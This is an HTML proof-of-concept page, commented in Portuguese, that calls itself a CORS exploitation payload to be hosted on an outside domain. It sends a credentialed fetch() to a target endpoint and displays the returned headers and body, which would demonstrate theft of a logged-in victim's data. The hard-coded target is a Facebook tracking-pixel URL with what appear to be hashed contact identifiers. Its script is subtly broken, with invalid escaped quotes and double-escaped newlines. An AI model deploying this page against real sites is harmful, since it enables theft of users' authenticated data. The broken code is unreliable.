<!--
Payload de exploração CORS: cole este arquivo em um domínio externo.
Acesse autenticado no domínio alvo para comprovar se a vulnerabilidade permite furto de dados/autenticação.
-->
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>CORS Exploit Demo</title>
    <style>
        body { font-family: Arial, sans-serif; background: #fafafa; color: #222; margin: 40px; }
        pre { background: #eee; padding: 10px; border-radius: 6px; }
    </style>
</head>
<body>
    <h2>Teste de exploração CORS</h2>
    <p>Ao clicar no botão abaixo, será feita uma requisição <strong>fetch</strong> com <code>credentials: "include"</code> para o endpoint vulnerável.<br>
    Se a resposta aparecer abaixo, está comprovada a vulnerabilidade!</p>
    <button onclick="testCORS()">Testar CORS</button>
    <h3>Resposta da API:</h3>
    <pre id="output">(aguardando execução...)</pre>

    <script>
    // Altere a URL abaixo para seu endpoint alvo (se necessário)
    const targetUrl = "https://www.facebook.com/tr/?id=619464952447923&ev=PageView&dl=https%3A%2F%2Frd.app%2Fpayment%2F9ec688cf-bcfe-40aa-9f78-fe95e9fe364f&rl=&if=false&ts=1745755366359&sw=1920&sh=1080&udff[ph]=b6d0d2a8b5fcd85cd449a28ca62c9097eaecc9ae7fceb282b6c3a43004dbbc5a&udff[em]=65a7539178902ed5cb9edd7914c3168eb7a7a481e0b9044628cde339c1129bcd&v=2.9.199&r=stable&a=tmSimo-GTM-WebTemplate&ec=6&o=6174&fbp=fb.1.1745754643602.455394502486089653&ler=empty&it=1745754642871&coo=false&cdl=&exp=k0&rqm=GET";

    function testCORS() {
        document.getElementById('output').textContent = "Enviando requisição cross-origin…";

        fetch(targetUrl, {
            credentials: "include", // envia cookies ou sessions vinculados ao domínio alvo
            method: "GET"
        })
        .then(async (resp) => {
            let text;
            try {
                text = await resp.text();
            } catch (e) {
                text = "[Falha ao ler o corpo da resposta]";
            }
            document.getElementById('output').textContent =
                "Status: " + resp.status + " " + resp.statusText + "\\n\\n" +
                "Headers:\\n" + Array.from(resp.headers.entries())
                    .map(([k,v])=>k+\": \"+v).join('\\n') + "\\n\\n" +
                "Body:\\n" + text;
        })
        .catch(err => {
            document.getElementById('output').textContent = "Erro na requisição: " + err;
        });
    }
    </script>
</body>
</html>

